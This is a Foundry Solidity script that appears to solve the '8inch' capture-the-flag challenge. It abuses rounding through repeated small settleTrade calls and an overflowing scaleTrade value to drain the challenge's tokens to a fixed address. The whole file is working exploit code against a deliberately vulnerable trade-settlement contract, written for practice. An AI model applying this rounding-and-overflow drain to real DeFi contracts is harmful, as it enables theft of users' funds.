// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Challenge, TradeSettlement} from "../src/8inch/8Inch.sol";
import {SimpleERC20} from "../src/8inch/ERC20.sol";

contract EightInchScript is Script {
    Challenge public challenge;
    TradeSettlement public t;
    SimpleERC20 public wojak;
    address public user;

    function setUp() public {
        challenge = Challenge(0x368F8017A2b3Af3416977ba4EB8DD21d60A2538E);
        console.log("isSolved", challenge.isSolved());

        t = challenge.tradeSettlement();
        wojak = challenge.wojak();

        console.log(
            "balance of wojak in challenge",
            wojak.balanceOf(address(challenge))
        );
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        user = vm.addr(privateKey);
        console.log("balance of wojak in user", wojak.balanceOf(user));
    }

    function run() public {
        vm.startBroadcast();

        t.settleTrade(0, 9);
        t.settleTrade(0, 9);
        t.settleTrade(0, 9);
        t.settleTrade(0, 5);
        SimpleERC20 weth2 = new SimpleERC20(
            "Wrapped Ether 2",
            "WETH2",
            18,
            10 ether
        );
        wojak.approve(address(t), 100);
        t.createTrade(address(wojak), address(weth2), 32, 0);
        t.scaleTrade(1, ((1 << 112) - 30) / 2);
        t.settleTrade(1, 10 ether);
        console.log("balance of wojak", wojak.balanceOf(user));
        wojak.transfer(address(0xc0ffee), 10 ether);
        vm.stopBroadcast();
    }
}
